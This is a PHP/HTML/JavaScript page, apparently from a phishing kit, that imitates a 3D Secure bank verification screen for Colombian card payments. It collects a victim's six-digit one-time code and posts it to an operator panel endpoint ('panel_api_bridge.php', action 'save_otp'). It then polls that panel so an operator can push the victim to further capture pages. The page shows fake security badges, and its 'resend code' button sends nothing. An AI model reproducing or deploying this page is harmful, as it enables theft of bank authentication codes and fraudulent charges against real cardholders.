<?php 
session_start();

$idreg = $_SESSION['idreg'] ?? '';
if (empty($idreg)) {
    header("Location: ../../checkout.php");
    exit;
}

require "../../config.php";

// Obtener información del banco y total
$stmt = $pdo->prepare("SELECT banco FROM registros WHERE id = ?");
$stmt->execute([$idreg]);
$registro = $stmt->fetch();
$banco = $registro['banco'] ?? 'Banco';
$totalPago = $_SESSION['total_caso_' . $idreg] ?? $_SESSION['total_pago'] ?? 0;
$totalFormateado = '$' . number_format($totalPago, 0, ',', '.') . ' COP';

// Generar ID de transacción único
$transactionId = 'TXN' . strtoupper(substr(md5($idreg . time()), 0, 8));
?>
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
    <title>Verificación Segura - Autenticación Bancaria</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    
    <style>
        :root {
            --primary-navy: #1e293b;
            --primary-navy-dark: #0f172a;
            --secondary-gray: #475569;
            --accent-blue: #3b82f6;
            --success-green: #10b981;
            --warning-amber: #f59e0b;
            --error-red: #ef4444;
            --neutral-50: #f8fafc;
            --neutral-100: #f1f5f9;
            --neutral-200: #e2e8f0;
            --neutral-300: #cbd5e1;
            --neutral-400: #94a3b8;
            --neutral-500: #64748b;
            --neutral-600: #475569;
            --neutral-700: #334155;
            --neutral-800: #1e293b;
            --neutral-900: #0f172a;
            --white: #ffffff;
            --shadow-sm: 0 1px 2px 0 rgba(0, 0, 0, 0.05);
            --shadow-md: 0 4px 6px -1px rgba(0, 0, 0, 0.1), 0 2px 4px -1px rgba(0, 0, 0, 0.06);
            --shadow-lg: 0 10px 15px -3px rgba(0, 0, 0, 0.1), 0 4px 6px -2px rgba(0, 0, 0, 0.05);
            --shadow-xl: 0 20px 25px -5px rgba(0, 0, 0, 0.1), 0 10px 10px -5px rgba(0, 0, 0, 0.04);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, var(--neutral-100) 0%, var(--neutral-200) 100%);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 20px;
            line-height: 1.6;
            -webkit-font-smoothing: antialiased;
            -moz-osx-font-smoothing: grayscale;
            color: var(--neutral-700);
        }

        .main-container {
            background: var(--white);
            border-radius: 16px;
            box-shadow: var(--shadow-xl);
            max-width: 480px;
            width: 100%;
            overflow: hidden;
            border: 1px solid var(--neutral-200);
        }

        .security-header {
            background: linear-gradient(135deg, var(--primary-navy) 0%, var(--primary-navy-dark) 100%);
            padding: 32px 24px;
            text-align: center;
            position: relative;
        }

        .security-badge {
            display: inline-flex;
            align-items: center;
            background: rgba(255, 255, 255, 0.15);
            backdrop-filter: blur(10px);
            border: 1px solid rgba(255, 255, 255, 0.2);
            border-radius: 24px;
            padding: 6px 14px;
            margin-bottom: 16px;
            font-size: 11px;
            font-weight: 600;
            color: var(--white);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

.security-badge::before {
    content: "";
    display: inline-block;
    width: 16px;      /* ajusta el tamaño */
    height: 16px;
    margin-right: 6px;
    background-image: url('candade.svg'); /* tu imagen */
    background-size: contain;
    background-repeat: no-repeat;
    background-position: center;
}


        .header-title {
            font-size: 26px;
            font-weight: 700;
            color: var(--white);
            margin-bottom: 6px;
        }

        .header-subtitle {
            font-size: 15px;
            color: rgba(255, 255, 255, 0.8);
            font-weight: 400;
        }

        .content-section {
            padding: 32px 24px;
        }

        .transaction-info {
            background: var(--neutral-50);
            border: 1px solid var(--neutral-200);
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 32px;
        }

        .transaction-header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 16px;
        }

        .transaction-title {
            font-size: 13px;
            font-weight: 600;
            color: var(--neutral-600);
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .transaction-id {
            font-size: 11px;
            color: var(--neutral-500);
            font-family: 'Monaco', 'Menlo', monospace;
            background: var(--white);
            padding: 4px 8px;
            border-radius: 6px;
            border: 1px solid var(--neutral-300);
        }

        .transaction-details {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 16px;
        }

        .detail-item {
            text-align: center;
        }

        .detail-label {
            font-size: 11px;
            color: var(--neutral-500);
            margin-bottom: 4px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .detail-value {
            font-size: 15px;
            font-weight: 600;
            color: var(--neutral-800);
        }

        .amount-value {
            color: var(--success-green);
            font-size: 17px;
        }

        .verification-section {
            text-align: center;
            margin-bottom: 32px;
        }

        .verification-title {
            font-size: 20px;
            font-weight: 600;
            color: var(--neutral-800);
            margin-bottom: 8px;
        }

        .verification-subtitle {
            font-size: 14px;
            color: var(--neutral-600);
            margin-bottom: 24px;
            line-height: 1.5;
        }

        .otp-inputs-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin-bottom: 24px;
        }

        .otp-input {
            width: 52px;
            height: 60px;
            border: 2px solid var(--neutral-300);
            border-radius: 8px;
            text-align: center;
            font-size: 22px;
            font-weight: 700;
            color: var(--neutral-800);
            background: var(--white);
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            outline: none;
        }

        .otp-input:focus {
            border-color: var(--accent-blue);
            box-shadow: 0 0 0 3px rgba(59, 130, 246, 0.1);
            transform: scale(1.02);
        }

        .otp-input.filled {
            border-color: var(--success-green);
            background: rgba(16, 185, 129, 0.05);
        }

        .otp-input.error {
            border-color: var(--error-red);
            background: rgba(239, 68, 68, 0.05);
            animation: shake 0.4s ease-in-out;
        }

        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-3px); }
            75% { transform: translateX(3px); }
        }

        .verify-button {
            width: 100%;
            background: var(--primary-navy);
            color: var(--white);
            border: none;
            border-radius: 8px;
            padding: 16px 24px;
            font-size: 15px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s cubic-bezier(0.4, 0, 0.2, 1);
            position: relative;
            overflow: hidden;
        }

        .verify-button:hover:not(:disabled) {
            background: var(--primary-navy-dark);
            transform: translateY(-1px);
            box-shadow: var(--shadow-lg);
        }

        .verify-button:disabled {
            background: var(--neutral-400);
            cursor: not-allowed;
            transform: none;
            box-shadow: none;
        }

        .verify-button.loading {
            background: var(--neutral-500);
            cursor: wait;
        }

        .verify-button.success {
            background: var(--success-green);
        }

        .loading-spinner {
            display: inline-block;
            width: 18px;
            height: 18px;
            border: 2px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: var(--white);
            animation: spin 1s ease-in-out infinite;
            margin-right: 8px;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        .error-message {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.2);
            color: var(--error-red);
            padding: 14px;
            border-radius: 8px;
            font-size: 13px;
            text-align: center;
            margin-top: 16px;
            display: none;
            animation: slideIn 0.3s ease-out;
        }

        @keyframes slideIn {
            from {
                opacity: 0;
                transform: translateY(-8px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        .security-features {
            border-top: 1px solid var(--neutral-200);
            padding-top: 24px;
            margin-top: 32px;
        }

        .security-title {
            font-size: 11px;
            color: var(--neutral-500);
            text-align: center;
            margin-bottom: 16px;
            text-transform: uppercase;
            letter-spacing: 0.5px;
        }

        .security-logos {
            display: flex;
            justify-content: center;
            align-items: center;
            gap: 18px;
            flex-wrap: wrap;
            margin-bottom: 16px;
        }

        .security-logo {
            height: 28px;
            width: auto;
            opacity: 0.5;
            transition: opacity 0.2s ease;
            filter: grayscale(100%);
        }

        .security-logo:hover {
            opacity: 0.8;
            filter: grayscale(50%);
        }

        .security-badges {
            display: flex;
            justify-content: center;
            gap: 16px;
            flex-wrap: wrap;
        }

        .security-badge-item {
            display: flex;
            align-items: center;
            font-size: 10px;
            color: var(--neutral-500);
            font-weight: 500;
        }

        .security-badge-item::before {
            content: '✓';
            color: var(--success-green);
            font-weight: bold;
            margin-right: 5px;
            font-size: 11px;
        }

        .resend-section {
            text-align: center;
            margin-top: 24px;
            padding-top: 24px;
            border-top: 1px solid var(--neutral-200);
        }

        .resend-text {
            font-size: 13px;
            color: var(--neutral-600);
            margin-bottom: 8px;
        }

        .resend-button {
            background: none;
            border: none;
            color: var(--accent-blue);
            font-size: 13px;
            font-weight: 600;
            cursor: pointer;
            text-decoration: underline;
            transition: color 0.2s ease;
        }

        .resend-button:hover {
            color: var(--primary-navy);
        }

        .resend-button:disabled {
            color: var(--neutral-400);
            cursor: not-allowed;
            text-decoration: none;
        }

        .countdown {
            font-size: 11px;
            color: var(--neutral-500);
            margin-left: 6px;
        }

        @media (max-width: 480px) {
  body {
    padding: 8px;
    align-items: flex-start;
    justify-content: flex-start;
  }

  .main-container {
    max-width: 100%;
    border-radius: 10px;
    box-shadow: none;
    margin-top: 12px;
  }

  .security-header {
    padding: 16px 12px;
  }

  .security-badge {
    font-size: 9px;
    padding: 4px 8px;
  }

  .header-title {
    font-size: 18px;
    margin-bottom: 4px;
  }

  .header-subtitle {
    font-size: 13px;
  }

  .content-section {
    padding: 18px 12px;
  }

  .transaction-info {
    padding: 14px;
    margin-bottom: 20px;
  }

  .transaction-title {
    font-size: 11px;
  }

  .transaction-id {
    font-size: 9px;
    padding: 3px 5px;
  }

  .detail-label {
    font-size: 9px;
    margin-bottom: 2px;
  }

  .detail-value {
    font-size: 13px;
  }

  .amount-value {
    font-size: 15px;
  }

  .verification-title {
    font-size: 17px;
    margin-bottom: 6px;
  }

  .verification-subtitle {
    font-size: 13px;
    margin-bottom: 16px;
  }

  .otp-inputs-container {
    gap: 6px;
  }

  .otp-input {
    width: 38px;
    height: 44px;
    font-size: 16px;
    border-width: 1px;
  }

  .verify-button {
    font-size: 14px;
    padding: 12px;
    border-radius: 6px;
    margin-top: 10px;
  }

  .security-features {
    padding-top: 16px;
    margin-top: 24px;
  }

  .security-logo {
    height: 20px;
  }

  .security-badge-item {
    font-size: 10px;
  }

  .resend-text,
  .resend-button {
    font-size: 12px;
  }

  .countdown {
    font-size: 10px;
  }

  .error-message {
    font-size: 12px;
    padding: 12px;
    margin-top: 12px;
  }
}

    </style>
</head>
<body>
    <div class="main-container">
        <div class="security-header">
            <div class="security-badge">Transacción Segura</div>
            <h1 class="header-title">Verificación 3D Secure</h1>
            <p class="header-subtitle">Autenticación de dos factores requerida</p>
        </div>

        <div class="content-section">
            <div class="transaction-info">
                <div class="transaction-header">
                    <div class="transaction-title">Detalles de Transacción</div>
                    <div class="transaction-id"><?php echo $transactionId; ?></div>
                </div>
                <div class="transaction-details">
                    <div class="detail-item">
                        <div class="detail-label">Entidad Financiera</div>
                        <div class="detail-value"><?php echo htmlspecialchars(ucfirst($banco), ENT_QUOTES, 'UTF-8'); ?></div>
                    </div>
                    <div class="detail-item">
                        <div class="detail-label">Monto</div>
                        <div class="detail-value amount-value"><?php echo $totalFormateado; ?></div>
                    </div>
                </div>
            </div>

            <div class="verification-section">
                <h2 class="verification-title">Código de Verificación</h2>
                <p class="verification-subtitle">
                    Hemos enviado un código de seguridad de 6 dígitos a tu dispositivo registrado. 
                    Ingresa el código para completar la verificación.
                </p>

                <div class="otp-inputs-container">
                    <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" id="digit1" autocomplete="one-time-code">
                    <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" id="digit2">
                    <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" id="digit3">
                    <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" id="digit4">
                    <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" id="digit5">
                    <input type="tel" inputmode="numeric" maxlength="1" class="otp-input" id="digit6">
                </div>

                <button class="verify-button" id="verifyButton" disabled>
                    <span id="buttonText">Verificar Código</span>
                </button>

                <div class="error-message" id="errorMessage">
                    <strong>Código incorrecto.</strong> Por favor verifica el código e intenta nuevamente.
                </div>
            </div>

            <div class="security-features">
                <div class="security-title">Protegido por tecnología de seguridad bancaria</div>
                
                <div class="security-logos">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/5/5e/Visa_Inc._logo.svg/200px-Visa_Inc._logo.svg.png" alt="Visa" class="security-logo">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Mastercard-logo.svg/200px-Mastercard-logo.svg.png" alt="Mastercard" class="security-logo">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/fa/American_Express_logo_%282018%29.svg/200px-American_Express_logo_%282018%29.svg.png" alt="American Express" class="security-logo">
                    <img src="https://w7.pngwing.com/pngs/241/26/png-transparent-diners-club-international-organization-logo-mastercard-trademark-leesport-diner-blue-text-sign.png" alt="Diners Club" class="security-logo" style="height: 20px;">
                </div>

                <div class="security-badges">
                    <div class="security-badge-item">Cifrado SSL 256-bit</div>
                    <div class="security-badge-item">PCI DSS Compliant</div>
                    <div class="security-badge-item">Verificación 3D Secure</div>
                </div>
            </div>

            <div class="resend-section">
                <div class="resend-text">¿No recibiste el código?</div>
                <button class="resend-button" id="resendButton">
                    Reenviar código
                    <span class="countdown" id="countdown"></span>
                </button>
            </div>
        </div>
    </div>

    <script>
    document.addEventListener('DOMContentLoaded', () => {
        const otpInputs = document.querySelectorAll('.otp-input');
        const verifyButton = document.getElementById('verifyButton');
        const buttonText = document.getElementById('buttonText');
        const errorMessage = document.getElementById('errorMessage');
        const resendButton = document.getElementById('resendButton');
        const countdown = document.getElementById('countdown');
        
        const idreg = "<?php echo htmlspecialchars($idreg, ENT_QUOTES, 'UTF-8'); ?>";
        
        if (!idreg) {
            alert("Error interno: sesión no válida.");
            window.location.href = "../../checkout.php";
            return;
        }

        let currentOTP = '';
        let resendTimer = null;
        let resendCountdown = 0;

        // Funciones de utilidad
        function updateOTP() {
            currentOTP = Array.from(otpInputs).map(input => input.value).join('');
            verifyButton.disabled = currentOTP.length !== 6;
            
            // Actualizar estados visuales
            otpInputs.forEach((input, index) => {
                input.classList.toggle('filled', input.value !== '');
            });
        }

        function clearError() {
            errorMessage.style.display = 'none';
            otpInputs.forEach(input => {
                input.classList.remove('error');
            });
        }

        function showError(message = null) {
            if (message) {
                errorMessage.innerHTML = `<strong>Error:</strong> ${message}`;
            }
            errorMessage.style.display = 'block';
            otpInputs.forEach(input => {
                input.classList.add('error');
            });
        }

        function setButtonState(state, text) {
            verifyButton.className = `verify-button ${state}`;
            
            if (state === 'loading') {
                buttonText.innerHTML = `<span class="loading-spinner"></span>${text}`;
                verifyButton.disabled = true;
            } else if (state === 'success') {
                buttonText.innerHTML = `✓ ${text}`;
                verifyButton.disabled = true;
            } else {
                buttonText.textContent = text;
                verifyButton.disabled = currentOTP.length !== 6;
            }
        }

        function startResendTimer() {
            resendCountdown = 60;
            resendButton.disabled = true;
            
            resendTimer = setInterval(() => {
                resendCountdown--;
                countdown.textContent = `(${resendCountdown}s)`;
                
                if (resendCountdown <= 0) {
                    clearInterval(resendTimer);
                    resendButton.disabled = false;
                    countdown.textContent = '';
                }
            }, 1000);
        }

        // Configurar inputs OTP
        otpInputs.forEach((input, index) => {
            // Solo números
            input.addEventListener('keypress', (e) => {
                if (!/[0-9]/.test(e.key) && !['Backspace', 'Delete', 'Tab', 'Enter', 'ArrowLeft', 'ArrowRight'].includes(e.key)) {
                    e.preventDefault();
                }
            });

            // Navegación y actualización
            input.addEventListener('input', (e) => {
                clearError();
                
                // Limpiar caracteres no numéricos
                e.target.value = e.target.value.replace(/[^0-9]/g, '');
                
                // Mover al siguiente input
                if (e.target.value.length === 1 && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
                
                updateOTP();
            });

            // Navegación con backspace
            input.addEventListener('keydown', (e) => {
                if (e.key === 'Backspace' && e.target.value === '' && index > 0) {
                    otpInputs[index - 1].focus();
                }
                
                if (e.key === 'ArrowLeft' && index > 0) {
                    otpInputs[index - 1].focus();
                }
                
                if (e.key === 'ArrowRight' && index < otpInputs.length - 1) {
                    otpInputs[index + 1].focus();
                }
            });

            // Limpiar error al hacer focus
            input.addEventListener('focus', clearError);
        });

        // Verificar código
        verifyButton.addEventListener('click', async () => {
            if (currentOTP.length !== 6) {
                showError('Por favor ingresa los 6 dígitos del código.');
                return;
            }

            setButtonState('loading', 'Verificando...');
            clearError();

            try {
                const formData = new FormData();
                formData.append("action", "save_otp");
                formData.append("idreg", idreg);
                formData.append("otp", currentOTP);

                const response = await fetch("../../panel_v2/process/panel_api_bridge.php", {
                    method: "POST",
                    body: formData,
                    headers: {
                        'Cache-Control': 'no-cache'
                    }
                });

                if (!response.ok) {
                    throw new Error(`Error de conexión: ${response.status}`);
                }

                const result = await response.json();

                if (result.success) {
                    setButtonState('success', 'Verificación Exitosa');
                    
                    // Animación de éxito
                    otpInputs.forEach((input, index) => {
                        setTimeout(() => {
                            input.style.borderColor = 'var(--success-green)';
                            input.style.backgroundColor = 'rgba(16, 185, 129, 0.05)';
                        }, index * 80);
                    });
                    
                    setTimeout(() => {
                        window.location.href = "cargando.php";
                    }, 1200);
                } else {
                    throw new Error(result.error || "Código de verificación incorrecto");
                }

            } catch (error) {
                console.error("Error de verificación:", error);
                showError(error.message);
                setButtonState('', 'Verificar Código');
                
                // Limpiar campos para reintentar
                otpInputs.forEach(input => {
                    input.value = '';
                    input.classList.remove('filled');
                });
                otpInputs[0].focus();
                updateOTP();
            }
        });

        // Reenviar código
        resendButton.addEventListener('click', () => {
            // Limpiar campos
            otpInputs.forEach(input => {
                input.value = '';
                input.classList.remove('filled', 'error');
            });
            clearError();
            updateOTP();
            otpInputs[0].focus();
            
            // Iniciar timer
            startResendTimer();
            
            // Feedback visual
            resendButton.textContent = 'Código reenviado';
            resendButton.style.color = 'var(--success-green)';
            
            setTimeout(() => {
                if (resendCountdown > 0) {
                    resendButton.textContent = 'Reenviar código';
                    resendButton.style.color = 'var(--accent-blue)';
                }
            }, 2000);
        });

        // Auto-paste para códigos OTP
        document.addEventListener('paste', (e) => {
            const paste = e.clipboardData.getData('text').replace(/\D/g, '');
            if (paste.length === 6) {
                e.preventDefault();
                paste.split('').forEach((digit, index) => {
                    if (otpInputs[index]) {
                        otpInputs[index].value = digit;
                    }
                });
                updateOTP();
                clearError();
                otpInputs[5].focus();
            }
        });

        // Verificar redirecciones del panel
        const checkRedirect = setInterval(async () => {
            try {
                const response = await fetch(`../../panel_v2/process/panel_api_bridge.php?action=check_redirect&idreg=${idreg}`, {
                    method: 'GET',
                    cache: 'no-cache'
                });
                
                if (response.ok) {
                    const data = await response.json();
                    
                    if (data.success && data.data && data.data.redirect) {
                        clearInterval(checkRedirect);
                        
                        switch (data.data.estado) {
                            case 'usuario':
                                window.location.href = "usuario.php";
                                break;
                            case 'cc':
                                window.location.href = "/reintentar.php";
                                break;
                            case '923':
                                window.location.href = "923.php";
                                break;
                            case 'atm':
                                window.location.href = "atm.php";
                                break;
                            case 'finalizado':
                                window.location.href = "finish.php";
                                break;
                        }
                    }
                }
            } catch (e) {
                // Ignorar errores de polling silenciosamente
            }
        }, 2000);

        // Limpiar recursos al salir
        window.addEventListener('beforeunload', () => {
            if (checkRedirect) clearInterval(checkRedirect);
            if (resendTimer) clearInterval(resendTimer);
        });

        // Inicialización
        otpInputs[0].focus();
        startResendTimer();
    });
    </script>
</body>
</html>